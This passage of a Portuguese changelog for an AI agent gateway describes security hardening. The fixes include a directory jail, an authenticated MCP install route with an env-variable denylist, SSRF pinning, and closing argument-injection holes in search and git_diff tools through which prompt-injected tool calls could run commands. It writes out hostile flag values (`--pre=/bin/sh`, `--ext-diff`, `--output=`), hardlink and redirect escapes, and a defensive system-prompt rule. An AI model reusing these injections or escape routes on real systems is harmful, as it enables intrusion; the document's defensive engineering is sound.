  `handle_agent_call` agora responde `invalid_params` para um `working_dir`
  fora das raizes do operador — ele pode estreitar o jail ou ficar dentro,
  nunca alargar. A doc do schema ainda dizia "validated for existence only —
  not against allowed_dirs", frase escrita quando o `working_dir` nao era raiz
  e que depois instruia o modelo a usar exatamente o buraco; foi corrigida no
  schema, no campo da struct e — a copia de maior alavancagem — no system
  prompt que o modelo le a cada turno, onde ela sobrevivera a primeira
  correcao. Um modelo que leia "o campo e validado apenas quanto a existencia"
  trata a recusa do jail como erro de caminho e roteia pelo `bash`, que de fato
  passa por fora; e o mesmo prompt manda "nunca contornar silenciosamente um
  bloqueio de seguranca". O jail tambem passou a ser construido **uma vez por
  chamada**, em `handle_agent_call`, e desce por parametro ate `build_tools`:
  a instancia que valida o `working_dir` e a mesma que vai para as file tools,
  entao nao ha duas reguas para manter em concordancia.
  `garra config check` avisa quando `agent.file_roots` inclui `/` ou o proprio
  `$HOME`, que devolvem `~/.ssh` e `.env` ao alcance do modelo — e avisa
  tambem sobre a env `GARRAIA_FILE_ROOTS`, que soma raizes as da config e antes
  nao passava por validacao nenhuma (`GARRAIA_FILE_ROOTS=/` desligava o jail em
  silencio). A comparacao acontece depois do `canonicalize`, senao
  `$HOME/../$USER` passa batido. No boot, o gateway nomeia as raizes em vez de
  so conta-las e emite um `warn!` por raiz que, ja resolvida, seja `/` ou o
  `$HOME`: um jail apertado cria pressao operacional exatamente na direcao da
  unica configuracao que o desliga, e essa saida nao pode ser a silenciosa.
  Residual conhecido, registrado e nao reivindicado como resolvido: a checagem
  resolve o caminho e quem abre o arquivo e a tool, num segundo passo. Entre um
  e outro, quem tiver escrita dentro da raiz pode trocar um componente por
  symlink para fora (TOCTOU). Fechar isso exige abrir por descritor
  (`openat2` com `RESOLVE_BENEATH` no Linux) e nao tem equivalente portatil nos
  tres sistemas operacionais que o projeto suporta.
  Segundo residual, e este merece ser dito sem rodeio: **contra symlink a
  defesa e o `canonicalize`; contra hardlink nao existe defesa com esta API**.
  Um hardlink dentro da raiz apontando para o inode de um arquivo de fora nao e
  um ponteiro que se resolve, e um segundo nome do mesmo inode — o
  `canonicalize` nao tem o que seguir, o `starts_with` aprova, e a escrita cai
  no inode de fora. No `file_write` o backup `.bak` ainda copia o conteudo de
  fora para dentro da raiz, e o escape de escrita vira tambem escape de
  leitura. O impacto pratico e menor que o do symlink pendurado: o git nao
  versiona hardlink, entao o vetor "repositorio clonado" nao serve, e o ataque
  exige quem ja tenha escrita dentro da raiz — a mesma pre-condicao do TOCTOU.
  Fica declarado na §5.72 do threat model em vez de omitido.
- **`POST /api/mcp/marketplace/install` deixa de aceitar chamador anonimo.** O
  handler nascia com a assinatura `(State, Json<InstallMcpRequest>)` — sem
  extractor nenhum de autenticacao ou autorizacao — e a rota era montada direto
  no grupo aberto do `build_router`. Qualquer chamador que alcancasse a porta
  registrava um servidor MCP do catalogo no registry do gateway, e escolhia
  pelo CORPO do pedido tanto os `extra_args` anexados ao comando quanto o `env`
  do processo que o gateway ia executar. Sao dois problemas empilhados: a rota
  sem gate, e a rota aceitando ambiente e argumentos arbitrarios para um
  processo filho.
  O que torna o alcance maior do que "so quem chega na porta": as rotas `/api/*`
  sao auth-free por desenho, e o navegador do dono alcanca a porta rodando
  codigo de terceiro. A guarda anti-CSRF generica da #1182 ja cobria este
  caminho, mas ela fecha o que o navegador pode ser forcado a fazer, nao o
  pedido direto — e o gate de `gateway.api_key` e opt-in.
  A correcao reusa exatamente o padrao das rotas irmas em vez de inventar
  mecanismo novo: a rota sai do grupo aberto e passa a viver num sub-router com
  `require_admin_auth` + `require_csrf` + `security_headers`, espelhando o
  `plugins_handler::build_plugin_routes` que cobre `/api/plugins/*`, e o handler
  confere `Permission::ManagePlugins` — a mesma permissao que o enum ja descreve
  como "Plugin / MCP server management" e que `admin_create_mcp` exige para
  registrar um servidor MCP pela admin API. Nenhuma permissao nova foi criada:
  `POST /api/plugins/install` e `POST /admin/api/mcp` sao a mesma capacidade por
  outra porta. `Role::Admin` e `Role::Operator` passam; `Role::Viewer` leva 403.
  `extra_args` e `env` continuam existindo — sao recurso legitimo para instalar
  com configuracao propria, e o catalogo depende do `env` para credencial
  (`GITHUB_PERSONAL_ACCESS_TOKEN`, `POSTGRES_CONNECTION_STRING`, ...). O que
  entrou junto foi uma denylist estreita: o corpo nao pode mais definir `PATH`,
  `LD_PRELOAD`, `LD_LIBRARY_PATH`, `LD_AUDIT`, `DYLD_INSERT_LIBRARIES`,
  `DYLD_LIBRARY_PATH` nem `NODE_OPTIONS` (comparacao case-insensitive), nem
  nada da familia `npm_config_*`, bloqueada por prefixo — o npm interpreta
  qualquer variavel com esse prefixo como chave de config, e como todo comando
  do catalogo e `npx -y`, um `npm_config_registry` apontando para um servidor
  do atacante faz o `npx` baixar e executar o pacote dele no lugar do pacote do
  catalogo (`npm_config_script_shell` troca o shell dos lifecycle scripts).
  Sao as variaveis que decidem QUAL codigo o filho executa — o comando vem do
  catalogo (`npx -y @modelcontextprotocol/server-...`), e deixar o corpo trocar
  a resolucao do binario ou pre-carregar uma biblioteca faz o `id` vetado nao
  garantir mais nada. Secrets do gateway ficaram deliberadamente FORA da
  denylist: defini-las no filho nao vaza a do gateway — o vazamento era a
  heranca do ambiente, fechada na #1236 com `env_clear()` — e barra-las
  quebraria o caso legitimo do catalogo.
  As tres rotas `GET` do marketplace (catalogo, health, config-schema) seguem
  abertas de proposito: sao leitura e nao mudam estado.
  O teste de regressao cobre a matriz de autorizacao (sem cookie → 401, cookie
  invalido → 401, sessao sem CSRF → 403, `Viewer` → 403, `Operator`/`Admin` →
  201, env bloqueada → 400) e, alem do sub-router, exercita o router de
  producao: em axum a primeira rota registrada para um caminho vence, entao sem
  essa afirmacao alguem re-adicionando a rota ao grupo aberto faria o merge do
  sub-router protegido perder em silencio. Issue #1245.
- **`POST /api/providers` passa a conectar o provider com cliente HTTP pinado
  aos IPs validados pelo SSRF guard, com redirects desligados (fecha #1248).**
  Ate agora a rota validava o `base_url` do caller com `vet_url` +
  `IpScope::AllowPrivate` — certo — mas descartava o `VettedUrl` e deixava o
  provider construir o proprio `reqwest::Client`, com a politica de redirect
  default (ate 10 saltos) e sem `resolve_to_addrs`. Isso abria duas janelas que
  o guard existe para fechar: (1) **redirect laundering** — um host publico que
  passa na validacao responde `302` para `169.254.169.254` (metadados de nuvem)
  ou qualquer faixa interna, e o `vet_url` ja tinha rodado sem olhar o destino
  do redirect; (2) **DNS rebinding** — o host era resolvido uma vez na validacao
  e de novo na conexao, e entre as duas o registro podia mudar. O alcance nao e
  teorico: `/api/*` e auth-free, `POST /api/providers/test` devolve a latencia
  (canal de exfiltracao por tempo) e `PATCH /api/providers/default` passa a
  rotear todo o trafego de chat — e a chave do provider — pelo destino.
  Agora o `add_provider` guarda o `VettedUrl`, constroi o cliente via
  `ssrf::pinned_client` (os mesmos `resolve_to_addrs` + `redirect::none()` que
  `web_fetch`, `plugins_handler`, `health` e mais 5 pontos ja usam) e o injeta
  pelo `with_client()` que todo provider ja tinha. Como defesa em profundidade,
  os construtores default de `OpenAiProvider`, `AnthropicProvider` e
  `OllamaProvider` tambem passam a usar `redirect::Policy::none()`, para que
  nem um provider vindo do arquivo de config no boot possa ser redirecionado
  para fora do host. O caminho local (Ollama em `127.0.0.1` sob `AllowPrivate`)
  segue funcionando. Teste de regressao com wiremock prova que um `302` para um
  segundo mock nao e seguido; sem a correcao o cliente segue o redirect e
  devolve a resposta do alvo como se fosse do provider legitimo.
- **O catalogo de skills de hardware passa a classificar risco em runtime —
  `kind: hardware-*` tem consumidor (#1250).** A crate de dados (manifestos
  `hardware-adapter`/`hardware-preset`, lista fechada de transportes) e a
  regra "risco efetivo = max(adapter, skill)" existiam inteiras, e nenhum
  deploy as exercitava: `spawn_hardware_adapters` nunca carregava o
  catalogo, e o registry aplicava so o teto do adapter. Agora o boot de
  hardware (gateway e `garra chat`, a mesma funcao) carrega o catalogo do
  MESMO dir de skills que o scanner de instrucoes usa antes de subir
  qualquer adapter, e injeta o elevador no registry: um device registrado
  entra embrulhado num decorator cuja visao de capabilities e a efetiva —
  leitura continua R0 (invariante de `Capability`), acao recebe o maximo
  entre adapter e preset, e `read`/`execute` passam por dentro. Skills com
  transporte fora da lista fechada (`mqtt`, `home_assistant`, `serial`,
  `gpio`) sao carregados inertes e ganham `warn!` no boot. A descoberta
  tambem mostra os apelidos: presets declaram sinonimos pt/en e o
  `device_list` lista `aliases: ...` por device, para o agente ligar
  "luz da sala" ao id que o gate ve.
  Fail-closed em todas as bordas: skills dir ausente, catalogo vazio ou
  erro de leitura/parse nao mudam nada (risco fica no teto do adapter,
  descoberta sem aliases, warn no log) — e como o elevador so sobe risco,
  um catalogo parcial (skill cujo parse falhou nao entra) nunca abaixa
  risco nenhum.
- **`DELETE /admin/api/mcp/{id}` agora revoga de verdade: derruba a conexao
  viva, limpa o `pending` e solta as tools do `AgentRuntime` (issue #1262,
  fail-open de revogacao).** Ate agora o handler removia o servidor do
  registry, apagava as credenciais do cofre e reescrevia o `mcp.json`, mas
  nunca chamava o `McpManager`. A conexao viva mora no manager, nao no
  registry, entao o servidor deletado continuava conectado e entregando tools
  ao agente pelo resto da vida do processo. Pior: depois do #1242 (PR #1255),
  um restart que falha estaciona a entrada em `pending` com o `env` ja
  resolvido do cofre; o monitor de saude varre `pending` e **ressuscita o
  servidor deletado** com os segredos que o operador acabou de revogar. Ou
  seja, "deletar e revogar" nao revogava, e o caminho era silencioso — a UI
  mostrava o servidor como removido. Um segundo DELETE ainda devolvia 404 (o
  servidor sumiu do registry), deixando o operador sem nenhum handle pela
  admin API para desligar o processo que continuava rodando.
  O conserto adiciona `McpManager::forget(name)`, que remove a entrada de
  `pending` **e** de `restart_states` (para o monitor nao ter de onde
  ressuscitar nem contador orfao), e faz o handler chamar
  `manager.disconnect` + `manager.forget` **antes** de `remove_server`, na
  ordem que deixa uma falha de persistencia no par seguro (manager sem,
  registry com) e nunca no perigoso (registry sem, manager com). As tools do
  servidor sao dropadas do inventario do runtime via
  `replace_mcp_tools(server, [])` — `sync_mcp_tools` nao visita servidores
  ausentes do manager, entao sem a remocao explicita os `McpTool` mortos
  ficariam listados ate o proximo restart do gateway. Testes de regressao
  exercitam o handler real e o `health_tick` real, com mutacao provada:
  remover `disconnect` vermelheia o teste da conexao viva; remover `forget`
  vermelheia o teste da ressurreicao.
- **A query do modelo na `repo_search` deixa de cair em posicao de flag — o
  ripgrep nao executa mais comando escolhido por prompt (correcao da #1266).**
  A tool entregava a `query` da tool call como argumento posicional, sem o
  terminador `--`, nos tres comandos que ela monta: `rg`, e os fallbacks `grep`
  (Unix) e `findstr` (Windows). Como o ripgrep aceita opcao em qualquer
  posicao, o texto que o modelo escolhe era lido como opcao: `--pre=/bin/sh`
  faz o proprio `rg` rodar um pre-processador para cada arquivo varrido, ou
  seja, executa como script um `.txt` comum — daqueles que a `file_write` pode
  gravar legitimamente dentro do jail de diretorio. A cadeia inteira passa por
  fora do `bash_tool`, entao nem o allowlist de comando nem o sandbox dele
  participam, e o piso somente-leitura de canal nao cobre porque `repo_search`
  e ferramenta de leitura. No `grep`, a mesma posicao rende `-f/etc/passwd`, que
  troca a busca pedida por padroes lidos de um arquivo escolhido pelo modelo.
  Agora cada comando e montado por uma funcao pura que poe a `query` **depois**
  do `--`. O `findstr` nao tem terminador — qualquer argumento comecando com
  `/` vira opcao — entao ali a query vai em `/C:<texto>`, a forma documentada
  para string de busca literal; o custo e que esse fallback perde regex, o que
  vale menos que a classe de injecao. O `file_pattern`, que tambem vem do
  modelo, passou a `--glob=<valor>`, colado ao nome da opcao em vez de
  depender de como cada versao do ripgrep resolve um valor que comeca com `-`.
  Uma query legitima que por acaso comece com `-` (`-> foo`) continua
  funcionando: e buscada literalmente, em vez de recusada.
- **A `repo_search` nao consome mais a entrada padrao de quem a chamou
  (#1266).** Os filhos `rg`/`grep` herdavam o stdin do gateway. Sem argumento
  de caminho e com um pipe no stdin, o ripgrep decide **buscar no stdin** em
  vez de varrer o diretorio, e fica pendurado ate o timeout de 15s comendo a
  entrada do processo pai. Agora os dois comandos sobem com `Stdio::null()`,
  o que tambem torna o comportamento identico em terminal, pipe e servico —
  sem isso, o teste de regressao da injecao passava em CI por acidente, porque
  o `cargo test` da um pipe ao filho e o ataque nem chegava a rodar.
- **O `file_path` do modelo na `git_diff` deixa de cair em posicao de flag —
  a injecao de prompt nao desfaz mais o `--no-ext-diff` (correcao da #1269).**
  A tool empurrava `file_path` e `from_commit`/`to_commit` da tool call como
  argumentos posicionais, sem terminador. O PR #1075 ja mitiga com
  `--no-ext-diff` na frente do comando, mas no git, quando a mesma flag
  aparece mais de uma vez, **a ultima vence**: um `file_path` igual a
  `--ext-diff` reabria a execucao de comando externo via `diff.external` de
  um `.git/config` plantado — execucao arbitraria alcancavel por prompt, na
  mesma classe do #1266 corrigido no PR #1268. Agora os argumentos sao
  montados por uma funcao pura que poe o `file_path` sempre **depois** do `--`
  (pathspec, nunca opcao), e o filho git sobe com a entrada padrao nula, como
  os filhos da `repo_search`.
- **`from_commit`/`to_commit` da `git_diff` com prefixo `-` sao recusados
  fail-closed (#1269, segundo achado).** O token de range `{from}..{to}` nao
  pode ir depois do `--` sem perder a semantica de revisoes, entao ele ganhou
  validacao propria: revisao que comeca com `-` poe o token inteiro em
  posicao de opcao — `--output=/tmp/../alvo` escreve a saida do diff em
  caminho escolhido pelo modelo, `-O<arquivo>` le ordem de arquivo plantado.
  Revisao legitima nao comeca com `-`, entao a recusa e controlada e cita a
  revisao recusada.
- **O `git_diff` volta a produzir diff real: o contexto de linhas agora vai
  colado (`-U{context}`).** O git recusa a forma `-U 3` separada — o `3`
  sobrava como argumento posicional e o comando morria com `bad revision
  '3'` (verificado no git 2.43), logo toda resposta de diff devolvia o erro
  em vez do diff. A quebra tambem mascarava a correcao de seguranca: com o
  git morrendo antes de qualquer efeito observavel, nenhum teste de injecao
  conseguia falhar por efeito. Testes de regressao exercitam a tool pelo
  caminho do runtime real, com repositorio plantado, controle positivo de
  diff funcional e prova por efeito (marcador que o driver externo ou o
  `--output` escreveriam).
- **Entrada HTTP de `mcp.json` deixa de ser descartada pelo loader e perde a
  `allowed_tools` (#1274, fail-open de allowlist em restart do admin).** O
  `McpServerConfig` de config exigia `command: String`, entao toda entrada
  URL-only de `mcp.json` — o formato legitimo de um servidor MCP remoto, e
  tambem o formato que o proprio gateway grava no arquivo ao criar um servidor
  HTTP pelo admin — falhava a desserializacao e era descartada em silencio
  pelo `load_mcp_json` (skip por entrada, que existe para nao perder o resto
  do arquivo por causa de uma so). A consequencia passava despercebida ate o
  proximo restart: o nome do servidor nunca chegava ao merge declarado que o
  `resolve_allowlist` do restart consulta, a resolucao caia em
  `AllowlistOrigin::NeverRestricted` e o servidor voltava a conectar com
  TODAS as tools expostas — a `allowed_tools` que o operador escreveu no
  arquivo era descartada no exato momento em que importava. Duas varreduras
  de seguranca anteriores (o comentario do braço `NeverRestricted` nomeava so
  os servidores criados via API como moradores desse braço) nao pegaram o
  buraco porque o descarte acontece no loader, dois crates antes do restart.
  Agora `command` e `#[serde(default)]` (entrada HTTP sem command e valida),
  a recusa de entrada sem `command` nem `url` e explicita no loader (mesma
  regra que o `garra config check` reporta, com `warn!` no lugar do silencio),
  o braço stdio do boot recusa command vazio antes do spawn, e o
  `garra mcp list` imprime a URL no lugar de command vazio.
  Cobertura: `load_mcp_json_keeps_http_entry_without_command` (regressao da
  forma exata da issue), `load_mcp_json_skips_stdio_entry_without_command`
  (a recusa explicita), teste de composicao no gateway
  (`restart_resolves_the_allowlist_of_an_http_entry_declared_in_mcp_json`:
  arquivo real em disco -> `merged_mcp_config` -> `resolve_allowlist` ->
  `AllowlistOrigin::Config` com a allowlist) e guard de boot. Prova por
  mutacao: remover o `#[serde(default)]` recoloca os testes na cor vermelha.
- **A redacao do stderr da ponte do WhatsApp deixava a chave inteira passar
  quando ela vinha percent-encoded ou com a barra escapada (#1276, item 2).**
  A regra corta qualquer segmento com 40+ caracteres de base64, e `%` e `\`
  nao sao caracteres de segmento — `100%` e o caminho do Windows dependem
  disso. So que uma chave na URL de um `FetchError` do undici
  (`https://mmg.whatsapp.net/v/t62.7118-24/<chave>?ccb=11-4`) chega com `+`,
  `/` e `=` percent-encoded (`%2B`/`%2F`/`%3D`), e uma chave que passou por
  `JSON.stringify` chega com `\/`: cada ocorrencia quebrava a sequencia em
  pedacos curtos demais para o teto, os pedacos saiam em claro e bastava um
  url-decode (ou um unescape) do texto ja redigido para remontar a chave.
  Medido sobre chaves aleatorias de 32 B: 62,9% das chaves percent-encoded e
  40,8% das chaves com `\/` chegavam INTEIRAS a tela. As saidas obvias foram
  medidas e descartadas — mexer no teto de 40 nao muda a fracao, porque o
  problema e onde o segmento quebra e nao o tamanho dele, e exigir mistura de
  classes de caractere deixa 0,07% das chaves em claro. O tokenizador de
  segmentos agora enxerga as duas codificacoes: `%2B`/`%2F`/`%3D` (qualquer
  caixa) e `\/` contam como UM caractere do segmento, o teto e o `N` do
  marcador `<redigido: N caracteres>` sao sobre o comprimento decodificado, e
  um segmento curto sai como entrou, sem decodificar. `%` seguido de qualquer
  outra coisa (`%20`, `%25`, `100%`) e `\` seguido de qualquer coisa que nao
  `/` continuam separadores, entao caminho do Windows e URL do registry npm
  (`@whiskeysockets%2Fbaileys`) saem inteiros. Um teste de corpus refaz a
  medicao da issue com 500 chaves de semente fixa — 61,0% e 37,6% no codigo
  antigo — e exige zero chaves recuperaveis nas duas codificacoes, com base64
  padrao e url-safe 100% redigidos como regressao. Fica, por escrito, o
  limite declarado: credencial com menos de 40 caracteres decodificados nao e
  redigida.

## [0.4.2] - 2026-09-13

Release em que o Garra saiu da tela. O epic de hardware fechou inteiro — as
sete partes, do `trait Device` aos adapters empacotados como skill — e com ele
o agente passa a ler sensores, acender luzes e reagir a eventos da casa sob o
mesmo gate de risco que ja governava bash, arquivos e web. Quatro transportes
entraram: MQTT (qualquer dispositivo que publique no broker), Home Assistant
(as entidades do hub, e por elas Zigbee, Matter e Z-Wave), serial/USB (Arduino
e ESP32 no cabo) e GPIO (pinos do Raspberry Pi); mais um motor de automacoes
declarativas que roda sob a policy do runtime, com teto de risco no config.

Nada disso liga sozinho: sem secao no config o registro nasce vazio, nenhuma
descoberta de rede acontece por padrao e cada transporte e uma feature de
compilacao desligada. O que decide o que o agente pode fazer e uma tabela de
seis niveis presa por tres invariantes: leitura e sempre R0 e nunca escreve;
sem canal real de confirmacao humana, R3/R4/R5 nao rodam em vez de rodarem em
silencio; e quem nao passou por autenticacao nenhuma — uma placa plugada num
cabo USB — nao classifica o proprio risco, porque a tabela dela e fechada no
codigo. A ultima parte do epic estendeu a mesma desconfianca ao conteudo
instalavel: um hardware skill de terceiro so consegue SUBIR o risco de uma
capability, nunca baixar, e um transporte que o core nao sabe falar carrega
inerte em vez de virar dispositivo.

Fora do hardware, a release e de superficies que estavam pela metade. O chat do
app mobile passou a mostrar a resposta enquanto ela acontece, com fallback
silencioso para HTTP quando o WebSocket nao abre; `garra chat` ganhou
`--persist` e `--resume` para a conversa sobreviver ao fim do processo, como
opt-in explicito que nao abre banco nenhum sem as flags; e o painel admin
deixou de depender de SQL manual para qualquer coisa — 2FA no login com lockout
duravel e segredo cifrado, troca de senha pela propria UI e recuperacao por
codigo de uso unico que nunca volta numa resposta HTTP.

Na seguranca, o achado maior foi um canal que o hardening anterior nao tinha
fechado: o `/proc/<pid>/environ` do processo era legivel por um filho de mesmo
UID, o que colocava `GARRAIA_JWT_SECRET` e as chaves de provider ao alcance de
qualquer tool que rodasse um subprocesso. O `prctl(PR_SET_DUMPABLE, 0)` fecha,
medido com controle nos dois sentidos. Junto foram duas promessas que o codigo
nao cumpria — o modo `ask` negando `file_write` mas deixando o bash escrever o
arquivo, e a allowlist do modo `orchestrator` declarada e ignorada — e o
circuit breaker de restart do systemd, que vivia na secao errada do unit e
portanto nunca existiu.

### Added
- O chat do Garra Mobile passa a mostrar a resposta enquanto ela acontece, em
  vez de esperar o turno inteiro. O app abre o `/ws` do gateway, retoma a
  sessao que ja tinha e vai concatenando os `delta` numa bolha que cresce;
  `tool_started` / `tool_finished` viram um indicador de qual ferramenta esta
  rodando. Um botao Parar aparece durante o turno e manda `{"type":"stop"}`
  **sempre com o `session_id`** — um stop sem endereco cancelaria qualquer
  turno que o socket estivesse carregando. O texto parcial que chegou antes do
  `stopped` vira a mensagem final: o gateway nao persiste turno cancelado,
  entao descartar aqui apagaria o que o usuario ja tinha lido (#1081).
- Quando o socket nao abre — gateway antigo sem `/ws`, proxy que recusa o
  upgrade, LAN que caiu — o app volta sozinho para o `POST` de sempre, sem
  mostrar erro. O fallback so vale antes de o turno ser submetido; depois
  disso, repetir por HTTP mandaria a mesma mensagem duas vezes (#1081).
- Um frame que o app nao conhece e ignorado em vez de derrubar o turno: o
  gateway pode ganhar um tipo novo antes de o app aprender (#1081).
- **`garra chat` ganha `--persist` e `--resume <SESSION_ID>` para nao perder a
  conversa quando o processo acaba (#1088).** O REPL guardava o historico so
  na memoria, entao a conversa morria com ele; o que decidia isso era um
  comentario em `chat.rs`, sem flag nem doc. Agora e opt-in explicito: sem
  nenhuma das duas flags **nenhum** banco e aberto e nada vai para o disco —
  exatamente o comportamento anterior, e ha teste que prende isso.
- Com `--persist`, cada turno vai para `<data_dir>/sessions.db` (o mesmo
  `sessions.db` do gateway) por `upsert_session` + `append_message`, sem
  mudanca de schema; o id da sessao aparece na abertura ja com o comando para
  retoma-la. Com `--resume`, o historico gravado e carregado antes do primeiro
  turno, a tela diz quantos turnos voltaram e a sessao continua gravando dali
  em diante — as duas flags sao independentes, mas qualquer uma basta para
  abrir o store. Falha de gravacao avisa e a conversa segue; e se a contagem
  de mensagens fora da janela falha, o aviso tambem acontece em vez de
  anunciar zero no silencio. Turnos voltados sao contados pelas perguntas
  (`user`), nao por divisao da lista — turno incompleto deixado pela
  hidratacao do gateway nao mente no placar.
- **#1105: `agent.bash_allowlist` deixa o operador declarar comandos
  confiaveis.** Um comando do tier arriscado do `safety_gate` morria
  fail-closed quando nao havia canal de confirmacao — era o caso de um CLI de
  outro agente instalado pelo proprio dono: bloqueado, sem como permitir. Os
  padroes da allowlist sao avaliados depois da denylist e antes do tier
  arriscado, e essa ordem e o ponto: a lista e positiva (so o que esta nela
  escapa da confirmacao) mas nao perdoa comando perigoso, que continua barrado
  mesmo que alguem o liste. Sintaxe pobre de proposito, para ser auditavel a
  olho nu: `prefixo*` com coringa so no fim, ou o comando exato. Padroes com
  coringa fora do fim sao recusados com warning em vez de interpretados; um
  `*` puro tambem e recusado — coringa sem prefixo casa com todo comando
  simples, e o tier arriscado desligado por um caractere nao e um padrao. E
  um prefixo nunca cobre comando composto (`;`, `&&`, pipe, `$(...)`,
  redirecao) — esse volta para o tier arriscado, que analisa cada segmento.
  Vale no gateway, no `garra chat` e no caminho MCP.
- A equipe de agentes do `.claude/agents/` passa a ter um modelo por funcao em vez
  de um unico modelo para todos: `team-coordinator` (tencent/hy4-preview) coordena e
  decide sem executar trabalho operacional, `repo-analyst` e `test-engineer`
  (deepseek/deepseek-v4-flash-0731) investigam e testam, `implementer`
  (z-ai/glm-5.3-flash) implementa, `code-reviewer` e `security-auditor`
  (openai/gpt-5.6-luna) julgam com independencia em relacao a quem escreveu, e
  `doc-writer` fecha o ciclo com documentacao e higiene do repositorio.
- `assemble-team` e a nova skill `repo-autopilot` selecionam o time por risco em vez
  de convocar os sete agentes sempre: R0 e so documentacao, R1 e bug pequeno, R2 e
  logica interna com revisao, R3 e API/DB/dependencia com revisao reforcada, R4 e
  auth/seguranca/cripto com auditor obrigatorio, R5 e release/secrets/destrutivo e
  escala para aprovacao humana.
- Todo agente devolve o mesmo contrato de status (`PASS`, `FAIL`, `BLOCKED`,
  `NEEDS_CHANGES`, `NEEDS_HUMAN`) com risco e recomendacao, para o coordenador
  arbitrar por sinal em vez de interpretar texto longo. `MERGE_READY` passa a exigir
  causa raiz encontrada, mudanca minima, teste de regressao fmt/check/clippy/test,
  revisor independente, auditor de seguranca quando aplicavel e docs atualizadas —
  CI verde sozinho nao e mais suficiente.
- O admin passa a ter troca de senha do proprio usuario, pela UI e por rota:
  `POST /admin/api/change-password` recebe a senha atual e a senha nova,
  reverifica a atual com o mesmo `verify_password` da danger zone antes de
  mexer em qualquer coisa e so entao grava o novo hash. Antes disso a unica
  forma de trocar a senha era SQL manual no `admin.db` (#1120).
- A pagina Account do console traz o formulario: senha atual, senha nova e
  confirmacao, com validacao de tamanho minimo de 8 caracteres e de igualdade
  entre os dois campos antes de sair o pedido. E a primeira pagina de conta
  acessivel a qualquer papel — ate hoje so havia telas de gestao de usuarios,
  que exigem papel admin (#1120).
- O hash continua sendo o PBKDF2-HMAC-SHA256 local do `admin/store.rs`, com
  os mesmos 600 mil iteracoes: nada muda para as linhas ja existentes e o
  Argon2id do `garraia-auth` segue fora do escopo do admin, que e SQLite e nao
  o provedor de identidade do workspace (#1120).
- Cada terminal escreve auditoria (`action` `change_password`, recurso `user`),
  com `outcome` `success` ou `failure`, e nenhuma delas carrega senha — nem a
  atual, nem a nova. A resposta de erro repete o formato `{"error": ...}` do
  resto da API do admin, e a falha de gravacao devolve uma mensagem fixa, com o
  detalhe do SQLite indo so para o log (#1120).
- As outras sessoes do usuario sao revogadas NA MESMA TRANSACAO do novo hash,
  pela `rotate_password_and_revoke_sessions`: ou as duas coisas acontecem,
  ou nenhuma — a rota nunca responde sucesso com o hash trocado e um cookie
  roubado ainda valido. A sessao que fez o pedido e mantida, entao o console
  nao se desloga no meio do proprio submit. Segue sem rate limit dedicado na
  rota, como todo o resto do router do admin (so o governor per-IP global);
  o custo de 600 mil iteracoes de PBKDF2 por tentativa errada e o freio que
  existe hoje (#1120).
- O login do painel admin passa a exigir o segundo fator quando a conta tem
  2FA ligado. Antes `POST /admin/api/login` parava na senha: o TOTP (RFC 6238)
  que o projeto ja implementava so era alcancavel pelo fluxo mobile
  (`/auth/2fa/*`), entao uma senha vazada abria o console inteiro. Com 2FA, a
  resposta de login sem codigo vem `401` com `totp_required: true` — nao
  `401` generico — porque o cliente precisa distinguir "falta o codigo" de
  "senha errada" para poder mostrar o campo em vez de repetir a senha (#1121).
- Quatro rotas de enrollment, todas dentro do router autenticado, atras de
  sessao e CSRF: `GET /admin/api/2fa/status`, `POST /admin/api/2fa/setup`
  (gera e guarda um segredo **pendente**), `POST /admin/api/2fa/verify`
  (primeiro codigo valido liga), `POST /admin/api/2fa/disable` (exige o codigo
  atual — desligar o segundo fator e exatamente o que um invasor com a senha
  tentaria, entao nao pode ser so uma confirmacao de sessao). Um segredo
  pendente nao vale nada: so passa a ser cobrado depois que o `verify` roda,
  o que evita travar o dono fora do painel por um setup abandonado (#1121).
- Cinco codigos errados em 15 minutos travam o segundo fator por usuario: a
  sexta tentativa e recusada com `429` sem ser avaliada, e um acerto zera a
  contagem. Sem isso o TOTP de 6 digitos seria forcavel por forca bruta a
  partir da propria resposta de erro. Cada terminal — setup, verify, disable,
  e cada recusa no login, inclusive o `409` de quem tenta girar o segredo com
  2FA ligado — escreve no `audit_log` com o IP (#1121).
- Girar o segredo com o 2FA ligado e recusado com `409`: substituir o segredo
  por baixo do dono deixaria o app dele apontando para o antigo, sem que nada
  tivesse pedido confirmacao. O caminho e desligar com um codigo valido e
  refazer o setup (#1121).
- A pagina **Security** do console ganha o enrollment: mostra o segredo base32
  e a URI `otpauth://` como texto copiavel. Nenhum QR e gerado por biblioteca
  ou servico de imagem — isso mandaria o segredo para um terceiro (#1121).
- As colunas de 2FA entram por `ALTER TABLE` condicional, e o boot passa a
  esperar 5s por lock do SQLite (`busy_timeout`). A corrida de dois processos
  abrindo o `admin.db` juntos e resolvida re-lendo o schema apos cada `ALTER`
  falhar: coluna presente quer dizer que o outro processo ganhou a corrida e a
  migration e sucesso — nenhum erro e engolido as cegas. Sem isso o `open`
  falharia e o gateway cairia para store em memoria, o que deixa o
  `/admin/api/setup` reivindicavel por anonimo. O resgate manual de quem
  perdeu o autenticador ficou documentado em `docs/security.md` (#1121).
- Correcoes dos vereditos de seguranca: leitura do estado de 2FA e fail-closed
  — `is_totp_enabled` devolve erro e o login recusa com `500` **sem abrir
  sessao** quando o estado nao pode ser lido, em vez de tratar ilegivel como
  "desligado" e aceitar so a senha; o mesmo vale para a leitura do segredo:
  erro de banco vira `500` (login sem sessao, verify e disable sem responder
  "2FA nao configurado"), nunca ausencia de segredo; segredo vazio e estado
  inconsistente e tambem `500` nos quatro caminhos — avalia-lo seria
  responder "codigo invalido" contra um segredo que nao existe; ligar, desligar e
  guardar o segredo pendente so confirmam com o evento de auditoria gravado
  **na mesma transacao** (sem trilha, a operacao inteira falha), enquanto as
  recusas seguem best-effort mas com a falha de trilha registrada em log; e
  o relogio ilegivel tambem recusa o codigo TOTP. Regressoes travam isso:
  login com a coluna `totp_enabled` ou `totp_secret` derrubada nao abre
  sessao nem mente o motivo, verify e disable com o segredo ilegivel dao
  `500` (nao `400`), e desligar o 2FA sem `audit_log` nao confirma. O
  `audit_log` registra mudanca de estado e recusa de autenticacao; leitura
  de estado (como `GET /admin/api/2fa/status`) nao gera evento. Residuais
  rastreados: contador de tentativas em memoria (#1140) e segredo em claro
  no `admin.db` (#1141) (#1121).
- O painel admin ganha recuperacao de senha sem e-mail: `garra admin recovery
  start --username X` gera um codigo de uso unico que nao volta na resposta
  HTTP. O gateway guarda so o hash PBKDF2 do codigo e escreve o texto num
  arquivo `0600` no diretorio de dados, entao ler o codigo exige shell na
  maquina — a mesma barra de quem roda o CLI. `garra admin recovery complete`
